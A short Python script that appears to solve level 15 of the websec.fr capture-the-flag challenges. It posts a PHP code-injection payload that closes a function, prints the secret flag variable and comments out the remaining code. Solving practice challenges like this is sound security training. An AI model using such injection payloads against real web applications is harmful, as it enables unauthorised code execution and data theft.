import requests
from requests import *

url = 'http://websec.fr/level15/index.php'

data = {
    'c' : ';} print_r($flag); /*',
    'submit' : 'Submit'
}

r = post(url , data=data)
print r.text
